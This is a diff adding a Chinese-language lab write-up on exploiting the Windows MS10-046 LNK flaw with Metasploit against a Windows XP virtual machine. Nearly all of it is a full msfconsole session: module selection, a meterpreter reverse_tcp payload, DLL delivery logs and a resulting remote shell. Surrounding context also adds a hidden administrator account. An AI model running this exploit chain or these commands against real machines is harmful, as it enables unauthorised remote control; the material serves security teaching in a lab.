@@ -271,6 +271,155 @@ net localgroup administrators hacker /add
 
 ![管理员组用户](./penetration_testing_fig/user_in_admin.png)
 
+### MS10-046[快捷方式自动执行代码]
+
+#### 漏洞描述
+
+Microsoft Windows快捷方式LNK文件自动执行代码漏洞。Windows支持使用快捷方式或LNK文件。LNK文件是指向本地文件的引用，点击LNK文件与点击快捷方式所制定的目标具有相同效果。 Windows没有正确的处理LNK文件，特制的LNK文件可能导致 Windows自动执行快捷方式文件所指定的代码。这些代码可能位于USB驱动、本地或远程文件系统、光驱或其他位置，使用资源管理器查看了LNK文件所在的位置就足以触发这个漏洞受影响系统包括:Windows XP SP3/SP2、Vista SP2/SP1、Server 2008 R2/SP2和Win 7。
+
+#### 实验环境
+
+与上一小节的一致，两机的ip为：
+
+kali: `196.168.69.128`
+
+winxp: `196.168.69.130`
+
+#### 使用`msfconsole`进行渗透
+
+流程与上一小节的基本一致。
+
+::: info 流程
+`search ms10_046` $\rightarrow$ `use 0` $\rightarrow$ `show options` 并设置参数 $\rightarrow$ `set payload ***` $\rightarrow$ `run`
+:::
+
+```sh
+msf6 > search ms10_046
+
+Matching Modules
+================
+
+   #  Name                                                      Disclosure Date  Rank       Check  Description
+   -  ----                                                      ---------------  ----       -----  -----------
+   0  exploit/windows/browser/ms10_046_shortcut_icon_dllloader  2010-07-16       excellent  No     Microsoft Windows Shell LNK Code Execution
+   1  exploit/windows/smb/ms10_046_shortcut_icon_dllloader      2010-07-16       excellent  No     Microsoft Windows Shell LNK Code Execution
+   2  auxiliary/fileformat/multidrop                                             normal     No     Windows SMB Multi Dropper
+
+
+Interact with a module by name or index. For example info 2, use 2 or use auxiliary/fileformat/multidrop
+
+msf6 > use 0
+[*] No payload configured, defaulting to windows/meterpreter/reverse_tcp
+msf6 exploit(windows/browser/ms10_046_shortcut_icon_dllloader) > show options
+
+Module options (exploit/windows/browser/ms10_046_shortcut_icon_dllloader):
+
+   Name     Current Setting  Required  Description
+   ----     ---------------  --------  -----------
+   SRVHOST  0.0.0.0          yes       The local host or network interface to listen on. This must be an address on the local machine or 0.0.0.0 to listen on all addresses.
+   SRVPORT  80               yes       The daemon port to listen on (do not change)
+   SSLCert                   no        Path to a custom SSL certificate (default is randomly generated)
+   UNCHOST                   no        The host portion of the UNC path to provide to clients (ex: 1.2.3.4).
+   URIPATH  /                yes       The URI to use (do not change).
+
+
+Payload options (windows/meterpreter/reverse_tcp):
+
+   Name      Current Setting  Required  Description
+   ----      ---------------  --------  -----------
+   EXITFUNC  process          yes       Exit technique (Accepted: '', seh, thread, process, none)
+   LHOST     192.168.69.128   yes       The listen address (an interface may be specified)
+   LPORT     4444             yes       The listen port
+
+
+Exploit target:
+
+   Id  Name
+   --  ----
+   0   Automatic
+
+
+
+View the full module info with the info, or info -d command.
+
+msf6 exploit(windows/browser/ms10_046_shortcut_icon_dllloader) > set srvhost 192.168.69.128
+srvhost => 192.168.69.128
+msf6 exploit(windows/browser/ms10_046_shortcut_icon_dllloader) > set payload windows/meterpreter/reverse_tcp
+payload => windows/meterpreter/reverse_tcp
+msf6 exploit(windows/browser/ms10_046_shortcut_icon_dllloader) > run
+[*] Exploit running as background job 0.
+[*] Exploit completed, but no session was created.
+msf6 exploit(windows/browser/ms10_046_shortcut_icon_dllloader) > 
+[*] Started reverse TCP handler on 192.168.69.128:4444 
+[*] Send vulnerable clients to \\192.168.69.128\JJJmKegQbZ\.
+[*] Or, get clients to save and render the icon of http://<your host>/<anything>.lnk
+[*] Using URL: http://192.168.69.128/
+[*] Server started.
+```
+
+执行`run`之后会生成一个`url`，在靶机`winxp`浏览器访问该`url`后，在终端会受到反馈如下：
+
+```sh
+[*] 192.168.69.130   ms10_046_shortcut_icon_dllloader - Sending UNC redirect
+[*] 192.168.69.130   ms10_046_shortcut_icon_dllloader - Responding to WebDAV OPTIONS request
+[*] 192.168.69.130   ms10_046_shortcut_icon_dllloader - Received WebDAV PROPFIND request for /JJJmKegQbZ
+[*] 192.168.69.130   ms10_046_shortcut_icon_dllloader - Sending 301 for /JJJmKegQbZ ...
+[*] 192.168.69.130   ms10_046_shortcut_icon_dllloader - Received WebDAV PROPFIND request for /JJJmKegQbZ/
+[*] 192.168.69.130   ms10_046_shortcut_icon_dllloader - Sending directory multistatus for /JJJmKegQbZ/ ...
+[*] 192.168.69.130   ms10_046_shortcut_icon_dllloader - Received WebDAV PROPFIND request for /JJJmKegQbZ
+[*] 192.168.69.130   ms10_046_shortcut_icon_dllloader - Sending 301 for /JJJmKegQbZ ...
+[*] 192.168.69.130   ms10_046_shortcut_icon_dllloader - Received WebDAV PROPFIND request for /JJJmKegQbZ/
+[*] 192.168.69.130   ms10_046_shortcut_icon_dllloader - Sending directory multistatus for /JJJmKegQbZ/ ...
+[*] 192.168.69.130   ms10_046_shortcut_icon_dllloader - Received WebDAV PROPFIND request for /JJJmKegQbZ
+[*] 192.168.69.130   ms10_046_shortcut_icon_dllloader - Sending 301 for /JJJmKegQbZ ...
+[*] 192.168.69.130   ms10_046_shortcut_icon_dllloader - Received WebDAV PROPFIND request for /JJJmKegQbZ/
+[*] 192.168.69.130   ms10_046_shortcut_icon_dllloader - Sending directory multistatus for /JJJmKegQbZ/ ...
+[*] 192.168.69.130   ms10_046_shortcut_icon_dllloader - Received WebDAV PROPFIND request for /JJJmKegQbZ
+[*] 192.168.69.130   ms10_046_shortcut_icon_dllloader - Sending 301 for /JJJmKegQbZ ...
+[*] 192.168.69.130   ms10_046_shortcut_icon_dllloader - Received WebDAV PROPFIND request for /JJJmKegQbZ/
+[*] 192.168.69.130   ms10_046_shortcut_icon_dllloader - Sending directory multistatus for /JJJmKegQbZ/ ...
+[*] 192.168.69.130   ms10_046_shortcut_icon_dllloader - Received WebDAV PROPFIND request for /JJJmKegQbZ/desktop.ini
+[*] 192.168.69.130   ms10_046_shortcut_icon_dllloader - Sending 404 for /JJJmKegQbZ/desktop.ini ...
+[*] 192.168.69.130   ms10_046_shortcut_icon_dllloader - Sending LNK file
+[*] 192.168.69.130   ms10_046_shortcut_icon_dllloader - Received WebDAV PROPFIND request for /JJJmKegQbZ/FfyUz.dll.manifest
+[*] 192.168.69.130   ms10_046_shortcut_icon_dllloader - Sending 404 for /JJJmKegQbZ/FfyUz.dll.manifest ...
+[*] 192.168.69.130   ms10_046_shortcut_icon_dllloader - Sending DLL payload
+[*] 192.168.69.130   ms10_046_shortcut_icon_dllloader - Received WebDAV PROPFIND request for /JJJmKegQbZ/FfyUz.dll.123.Manifest
+[*] 192.168.69.130   ms10_046_shortcut_icon_dllloader - Sending 404 for /JJJmKegQbZ/FfyUz.dll.123.Manifest ...
+[*] Sending stage (176198 bytes) to 192.168.69.130
+[*] Meterpreter session 1 opened (192.168.69.128:4444 -> 192.168.69.130:1039) at 2024-12-30 03:03:07 -0500
+```
+
+此时执行`sessions 1`即可。
+
+```sh
+msf6 exploit(windows/browser/ms10_046_shortcut_icon_dllloader) > sessions 1
+[*] Starting interaction with 1...
+
+meterpreter > shell
+Process 208 created.
+Channel 1 created.
+Microsoft Windows XP [�汾 5.1.2600]
+(C) ��Ȩ���� 1985-2001 Microsoft Corp.
+
+C:\Documents and Settings\arwell\����>ipconfig
+ipconfig
+
+Windows IP Configuration
+
+
+Ethernet adapter ��������:
+
+        Connection-specific DNS Suffix  . : localdomain
+        IP Address. . . . . . . . . . . . : 192.168.69.130
+        Subnet Mask . . . . . . . . . . . : 255.255.255.0
+        Default Gateway . . . . . . . . . : 192.168.69.2
+
+C:\Documents and Settings\arwell\����>exit
+exit
+meterpreter > exit
+```
+
 ---
 
 ## 参考
